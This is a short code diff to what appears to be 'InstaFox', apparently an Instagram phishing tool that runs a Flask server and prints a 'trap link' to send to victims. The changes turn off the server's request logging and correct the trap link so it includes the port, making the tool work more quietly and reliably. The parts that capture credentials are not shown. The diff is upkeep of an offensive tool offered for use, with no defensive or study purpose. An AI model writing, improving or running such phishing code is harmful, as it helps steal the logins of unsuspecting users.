@@ -72,8 +72,8 @@ class InstaFox:
           from flask import Flask, request, render_template
           import logging
           app = Flask(__name__)
-          # log = logging.getLogger('werkzeug')
-          # log.disabled = True
+          log = logging.getLogger('werkzeug')
+          log.disabled = True
 
           @app.route('/')
           def home():
@@ -111,7 +111,7 @@ class InstaFox:
               print(Fore.YELLOW + "Your Trap Link: http://" + ip + ":" + self._fs._Opt["port"]["Body"] + Fore.RESET)
               app.run(host=ip,port=int(self._fs._Opt["port"]["Body"]))
             else:
-              print(Fore.YELLOW + "Your Trap Link: http://" + self._fs._Opt["host"]["Body"] + Fore.RESET)
+              print(Fore.YELLOW + "Your Trap Link: http://" + self._fs._Opt["host"]["Body"] + ":" + self._fs._Opt["port"]["Body"] + Fore.RESET)
               app.run(host=self._fs._Opt["host"]["Body"],port=int(self._fs._Opt["port"]["Body"]))
       except KeyboardInterrupt:
         pass
